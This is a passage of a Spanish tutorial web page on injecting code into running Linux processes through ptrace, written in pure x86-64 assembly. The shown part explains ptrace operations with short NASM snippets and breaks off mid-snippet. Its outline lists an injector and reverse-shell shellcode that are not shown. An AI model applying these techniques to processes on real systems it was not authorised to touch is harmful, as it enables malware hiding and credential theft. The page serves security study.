  <a href="#flujo-general-de-la-inyeccion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Flujo general de la inyección
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#inyector-principal-proc_injasm" class="md-nav__link">
    <span class="md-ellipsis">
      
        Inyector Principal (proc_inj.asm)
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#explicacion-detallada-del-codigo" class="md-nav__link">
    <span class="md-ellipsis">
      
        Explicación detallada del código
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Explicación detallada del código">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#seccion-data-el-shellcode-embebido" class="md-nav__link">
    <span class="md-ellipsis">
      
        Sección .data - El shellcode embebido
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#seccion-bss-buffers-para-registros" class="md-nav__link">
    <span class="md-ellipsis">
      
        Sección .bss - Buffers para registros
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-1-attach-y-detencion-del-proceso" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 1: Attach y detención del proceso
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-2-preservacion-del-contexto-de-ejecucion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 2: Preservación del contexto de ejecución
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-3-inyeccion-de-la-instruccion-syscall" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 3: Inyección de la instrucción syscall
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-4-configuracion-de-registros-para-mmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 4: Configuración de registros para MMAP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-5-ejecucion-controlada-de-la-syscall-mmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 5: Ejecución controlada de la syscall MMAP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-6-obtencion-del-resultado-de-mmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 6: Obtención del resultado de MMAP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-7-restauracion-de-los-bytes-originales" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 7: Restauración de los bytes originales
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-8-restauracion-de-los-registros-originales" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 8: Restauración de los registros originales
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-9-almacenamiento-del-rip-de-retorno" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 9: Almacenamiento del RIP de retorno
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-10-inyeccion-del-shellcode" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 10: Inyección del shellcode
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finalizacion-y-detach" class="md-nav__link">
    <span class="md-ellipsis">
      
        Finalización y DETACH
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shellcode-reverse-tcp-shell-proc_inj_rev_tcpasm" class="md-nav__link">
    <span class="md-ellipsis">
      
        Shellcode: Reverse TCP Shell (proc_inj_rev_tcp.asm)
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Shellcode: Reverse TCP Shell (proc_inj_rev_tcp.asm)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#explicacion-del-shellcode" class="md-nav__link">
    <span class="md-ellipsis">
      
        Explicación del shellcode
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Explicación del shellcode">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fork-bifurcacion-del-proceso" class="md-nav__link">
    <span class="md-ellipsis">
      
        fork() - Bifurcación del proceso
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#retorno-del-proceso-padre" class="md-nav__link">
    <span class="md-ellipsis">
      
        Retorno del proceso padre
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#setsid-nueva-sesion" class="md-nav__link">
    <span class="md-ellipsis">
      
        setsid() - Nueva sesión
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#socket-crear-socket-tcp" class="md-nav__link">
    <span class="md-ellipsis">
      
        socket() - Crear socket TCP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#connect-conectar-al-atacante" class="md-nav__link">
    <span class="md-ellipsis">
      
        connect() - Conectar al atacante
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dup2-redirigir-io" class="md-nav__link">
    <span class="md-ellipsis">
      
        dup2() - Redirigir I/O
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execve-ejecutar-shell" class="md-nav__link">
    <span class="md-ellipsis">
      
        execve() - Ejecutar shell
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#diagrama-de-memoria-post-inyeccion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Diagrama de memoria post-inyección
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#compilacion-y-uso" class="md-nav__link">
    <span class="md-ellipsis">
      
        Compilación y uso
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#consideraciones-de-seguridad" class="md-nav__link">
    <span class="md-ellipsis">
      
        Consideraciones de seguridad
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Consideraciones de seguridad">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#permisos-necesarios" class="md-nav__link">
    <span class="md-ellipsis">
      
        Permisos necesarios
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ptrace_scope-yama-lsm" class="md-nav__link">
    <span class="md-ellipsis">
      
        ptrace_scope (Yama LSM)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sobre-orig_rax" class="md-nav__link">
    <span class="md-ellipsis">
      
        Sobre orig_rax
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Tabla de contenidos
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduccion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Introducción
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Introducción">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#por-que-es-importante" class="md-nav__link">
    <span class="md-ellipsis">
      
        ¿Por qué es importante?
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#por-que-ensamblador-puro" class="md-nav__link">
    <span class="md-ellipsis">
      
        ¿Por qué ensamblador puro?
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#la-syscall-ptrace" class="md-nav__link">
    <span class="md-ellipsis">
      
        La Syscall ptrace
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="La Syscall ptrace">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#prototipo" class="md-nav__link">
    <span class="md-ellipsis">
      
        Prototipo
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#operaciones-de-ptrace-utilizadas" class="md-nav__link">
    <span class="md-ellipsis">
      
        Operaciones de ptrace utilizadas
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Operaciones de ptrace utilizadas">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ptrace_attach-16-0x10" class="md-nav__link">
    <span class="md-ellipsis">
      
        PTRACE_ATTACH (16 / 0x10)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ptrace_getregs-12-0x0c" class="md-nav__link">
    <span class="md-ellipsis">
      
        PTRACE_GETREGS (12 / 0x0C)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ptrace_setregs-13-0x0d" class="md-nav__link">
    <span class="md-ellipsis">
      
        PTRACE_SETREGS (13 / 0x0D)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ptrace_peekdata-2-0x02" class="md-nav__link">
    <span class="md-ellipsis">
      
        PTRACE_PEEKDATA (2 / 0x02)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ptrace_pokedata-5-0x05" class="md-nav__link">
    <span class="md-ellipsis">
      
        PTRACE_POKEDATA (5 / 0x05)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ptrace_singlestep-9-0x09" class="md-nav__link">
    <span class="md-ellipsis">
      
        PTRACE_SINGLESTEP (9 / 0x09)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ptrace_detach-17-0x11" class="md-nav__link">
    <span class="md-ellipsis">
      
        PTRACE_DETACH (17 / 0x11)
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#estructura-user_regs_struct" class="md-nav__link">
    <span class="md-ellipsis">
      
        Estructura user_regs_struct
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#consideraciones-sobre-little-endian" class="md-nav__link">
    <span class="md-ellipsis">
      
        Consideraciones sobre Little-Endian
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#flujo-general-de-la-inyeccion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Flujo general de la inyección
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#inyector-principal-proc_injasm" class="md-nav__link">
    <span class="md-ellipsis">
      
        Inyector Principal (proc_inj.asm)
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#explicacion-detallada-del-codigo" class="md-nav__link">
    <span class="md-ellipsis">
      
        Explicación detallada del código
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Explicación detallada del código">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#seccion-data-el-shellcode-embebido" class="md-nav__link">
    <span class="md-ellipsis">
      
        Sección .data - El shellcode embebido
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#seccion-bss-buffers-para-registros" class="md-nav__link">
    <span class="md-ellipsis">
      
        Sección .bss - Buffers para registros
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-1-attach-y-detencion-del-proceso" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 1: Attach y detención del proceso
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-2-preservacion-del-contexto-de-ejecucion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 2: Preservación del contexto de ejecución
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-3-inyeccion-de-la-instruccion-syscall" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 3: Inyección de la instrucción syscall
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-4-configuracion-de-registros-para-mmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 4: Configuración de registros para MMAP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-5-ejecucion-controlada-de-la-syscall-mmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 5: Ejecución controlada de la syscall MMAP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-6-obtencion-del-resultado-de-mmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 6: Obtención del resultado de MMAP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-7-restauracion-de-los-bytes-originales" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 7: Restauración de los bytes originales
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-8-restauracion-de-los-registros-originales" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 8: Restauración de los registros originales
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-9-almacenamiento-del-rip-de-retorno" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 9: Almacenamiento del RIP de retorno
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-10-inyeccion-del-shellcode" class="md-nav__link">
    <span class="md-ellipsis">
      
        Paso 10: Inyección del shellcode
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finalizacion-y-detach" class="md-nav__link">
    <span class="md-ellipsis">
      
        Finalización y DETACH
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shellcode-reverse-tcp-shell-proc_inj_rev_tcpasm" class="md-nav__link">
    <span class="md-ellipsis">
      
        Shellcode: Reverse TCP Shell (proc_inj_rev_tcp.asm)
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Shellcode: Reverse TCP Shell (proc_inj_rev_tcp.asm)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#explicacion-del-shellcode" class="md-nav__link">
    <span class="md-ellipsis">
      
        Explicación del shellcode
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Explicación del shellcode">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fork-bifurcacion-del-proceso" class="md-nav__link">
    <span class="md-ellipsis">
      
        fork() - Bifurcación del proceso
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#retorno-del-proceso-padre" class="md-nav__link">
    <span class="md-ellipsis">
      
        Retorno del proceso padre
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#setsid-nueva-sesion" class="md-nav__link">
    <span class="md-ellipsis">
      
        setsid() - Nueva sesión
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#socket-crear-socket-tcp" class="md-nav__link">
    <span class="md-ellipsis">
      
        socket() - Crear socket TCP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#connect-conectar-al-atacante" class="md-nav__link">
    <span class="md-ellipsis">
      
        connect() - Conectar al atacante
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dup2-redirigir-io" class="md-nav__link">
    <span class="md-ellipsis">
      
        dup2() - Redirigir I/O
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execve-ejecutar-shell" class="md-nav__link">
    <span class="md-ellipsis">
      
        execve() - Ejecutar shell
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#diagrama-de-memoria-post-inyeccion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Diagrama de memoria post-inyección
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#compilacion-y-uso" class="md-nav__link">
    <span class="md-ellipsis">
      
        Compilación y uso
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#consideraciones-de-seguridad" class="md-nav__link">
    <span class="md-ellipsis">
      
        Consideraciones de seguridad
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Consideraciones de seguridad">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#permisos-necesarios" class="md-nav__link">
    <span class="md-ellipsis">
      
        Permisos necesarios
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ptrace_scope-yama-lsm" class="md-nav__link">
    <span class="md-ellipsis">
      
        ptrace_scope (Yama LSM)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sobre-orig_rax" class="md-nav__link">
    <span class="md-ellipsis">
      
        Sobre orig_rax
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              
              <article class="md-content__inner md-typeset">
                
                  


  
  


<h1 id="process-injection-via-ptrace-just-asm">Process Injection via Ptrace - Just ASM<a class="headerlink" href="#process-injection-via-ptrace-just-asm" title="Permanent link">&para;</a></h1>
<figure class="hero-image">
<p><img alt="Ptrace Injection" src="../../../assets/images/ptrace-hero.svg" width="100%" /></p>
</figure>
<p>Inyección de código en procesos Linux usando ptrace, implementado completamente en ensamblador x86-64. Sin dependencias externas, sin libc, solo syscalls puras.</p>
<hr />
<h2 id="introduccion">Introducción<a class="headerlink" href="#introduccion" title="Permanent link">&para;</a></h2>
<p>La inyección de procesos es una técnica fundamental en el arsenal de cualquier investigador de seguridad, desarrollador de malware o ingeniero de sistemas. Consiste en insertar y ejecutar código arbitrario dentro del espacio de memoria de un proceso que ya está en ejecución, sin necesidad de modificar el binario original en disco.</p>
<h3 id="por-que-es-importante">¿Por qué es importante?<a class="headerlink" href="#por-que-es-importante" title="Permanent link">&para;</a></h3>
<p>Esta técnica tiene aplicaciones tanto legítimas como maliciosas:</p>
<p><strong>Usos legítimos:</strong></p>
<ul>
<li><strong>Depuración</strong>: Herramientas como GDB, LLDB y otros depuradores utilizan ptrace para inspeccionar y controlar procesos, establecer breakpoints, y examinar el estado de la memoria y registros.</li>
<li><strong>Instrumentación dinámica</strong>: Herramientas como strace (para trazar syscalls) y ltrace (para trazar llamadas a bibliotecas) dependen completamente de ptrace.</li>
<li><strong>Profiling y análisis de rendimiento</strong>: Permite insertar código de medición sin recompilar la aplicación.</li>
<li><strong>Hot-patching</strong>: Actualizar código en producción sin reiniciar servicios críticos.</li>
</ul>
<p><strong>Usos maliciosos:</strong></p>
<ul>
<li><strong>Malware y rootkits</strong>: Inyectar payloads en procesos legítimos para evadir detección.</li>
<li><strong>Robo de credenciales</strong>: Inyectar código en navegadores o gestores de contraseñas.</li>
<li><strong>Persistencia</strong>: Mantener acceso incluso si el binario malicioso original es eliminado.</li>
<li><strong>Evasión de seguridad</strong>: Ejecutar código desde procesos confiables para bypass de firewalls y EDRs.</li>
</ul>
<h3 id="por-que-ensamblador-puro">¿Por qué ensamblador puro?<a class="headerlink" href="#por-que-ensamblador-puro" title="Permanent link">&para;</a></h3>
<p>Implementar esta técnica en ensamblador puro (sin libc) tiene varias ventajas:</p>
<ol>
<li><strong>Comprensión profunda</strong>: Obliga a entender exactamente qué está pasando a nivel de sistema operativo.</li>
<li><strong>Sin dependencias</strong>: El binario resultante no depende de bibliotecas externas.</li>
<li><strong>Tamaño mínimo</strong>: Ideal para shellcodes y payloads donde el espacio es limitado.</li>
<li><strong>Control total</strong>: No hay abstracciones que oculten el comportamiento real.</li>
<li><strong>Aplicabilidad a shellcode</strong>: Las mismas técnicas se usan para escribir shellcodes position-independent.</li>
</ol>
<hr />
<h2 id="la-syscall-ptrace">La Syscall ptrace<a class="headerlink" href="#la-syscall-ptrace" title="Permanent link">&para;</a></h2>
<p><code>ptrace</code> (process trace) es una syscall de Linux que proporciona a un proceso (llamado <strong>tracer</strong>) la capacidad de observar y controlar la ejecución de otro proceso (llamado <strong>tracee</strong>). Es la base sobre la que se construyen los depuradores en Linux.</p>
<h3 id="prototipo">Prototipo<a class="headerlink" href="#prototipo" title="Permanent link">&para;</a></h3>
<div class="language-c highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kt">long</span><span class="w"> </span><span class="nf">ptrace</span><span class="p">(</span><span class="k">enum</span><span class="w"> </span><span class="n">__ptrace_request</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="kt">pid_t</span><span class="w"> </span><span class="n">pid</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">);</span>
</span></code></pre></div>
<p>En ensamblador x86-64:</p>
<ul>
<li><strong>RAX</strong> = 101 (número de syscall para ptrace)</li>
<li><strong>RDI</strong> = request (operación a realizar)</li>
<li><strong>RSI</strong> = pid (PID del proceso objetivo)</li>
<li><strong>RDX</strong> = addr (dirección, uso depende de la operación)</li>
<li><strong>R10</strong> = data (datos, uso depende de la operación)</li>
</ul>
<h3 id="operaciones-de-ptrace-utilizadas">Operaciones de ptrace utilizadas<a class="headerlink" href="#operaciones-de-ptrace-utilizadas" title="Permanent link">&para;</a></h3>
<h4 id="ptrace_attach-16-0x10">PTRACE_ATTACH (16 / 0x10)<a class="headerlink" href="#ptrace_attach-16-0x10" title="Permanent link">&para;</a></h4>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">          </span><span class="c1">; PTRACE_ATTACH</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">pid</span><span class="o">&gt;</span><span class="w">       </span><span class="c1">; PID del proceso objetivo</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>Propósito</strong>: Adjuntarse a un proceso existente para controlarlo.</p>
<p><strong>Comportamiento</strong>:</p>
<ul>
<li>El tracer se convierte en el "padre" del tracee para efectos de ptrace.</li>
<li>El kernel envía una señal <code>SIGSTOP</code> al tracee, deteniendo su ejecución.</li>
<li>El tracee queda en estado "stopped" hasta que el tracer lo reanude.</li>
<li>Requiere que el tracer tenga permisos adecuados (mismo UID, CAP_SYS_PTRACE, o root).</li>
</ul>
<p><strong>Importante</strong>: Después de PTRACE_ATTACH, <strong>siempre</strong> debes llamar a <code>wait()</code> o <code>waitpid()</code> para sincronizarte con la detención del proceso.</p>
<hr />
<h4 id="ptrace_getregs-12-0x0c">PTRACE_GETREGS (12 / 0x0C)<a class="headerlink" href="#ptrace_getregs-12-0x0c" title="Permanent link">&para;</a></h4>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">12</span><span class="w">          </span><span class="c1">; PTRACE_GETREGS</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">pid</span><span class="o">&gt;</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">buffer</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero a user_regs_struct</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>Propósito</strong>: Obtener todos los registros del CPU del tracee.</p>
<p><strong>Comportamiento</strong>:</p>
<ul>
<li>Copia el estado completo de los registros del tracee a un buffer en el tracer.</li>
<li>El buffer debe tener espacio para <code>user_regs_struct</code> (216 bytes en x86-64).</li>
<li>Incluye registros de propósito general, RIP, RSP, flags, y registros de segmento.</li>
</ul>
<p><strong>Uso típico</strong>: Guardar el estado original antes de modificar el proceso, para poder restaurarlo después.</p>
<hr />
<h4 id="ptrace_setregs-13-0x0d">PTRACE_SETREGS (13 / 0x0D)<a class="headerlink" href="#ptrace_setregs-13-0x0d" title="Permanent link">&para;</a></h4>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">13</span><span class="w">          </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">pid</span><span class="o">&gt;</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">buffer</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero a user_regs_struct modificada</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>Propósito</strong>: Establecer todos los registros del CPU del tracee.</p>
<p><strong>Comportamiento</strong>:</p>
<ul>
<li>Sobrescribe todos los registros del tracee con los valores del buffer.</li>
<li>Permite modificar el flujo de ejecución cambiando RIP.</li>
<li>Permite configurar argumentos para syscalls cambiando RDI, RSI, RDX, etc.</li>
</ul>
<p><strong>Uso típico</strong>: Preparar el tracee para ejecutar una syscall específica (como mmap) o redirigir la ejecución a código inyectado.</p>
<hr />
<h4 id="ptrace_peekdata-2-0x02">PTRACE_PEEKDATA (2 / 0x02)<a class="headerlink" href="#ptrace_peekdata-2-0x02" title="Permanent link">&para;</a></h4>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w">           </span><span class="c1">; PTRACE_PEEKDATA</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">pid</span><span class="o">&gt;</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">addr</span><span class="o">&gt;</span><span class="w">      </span><span class="c1">; dirección a leer en el tracee</span>
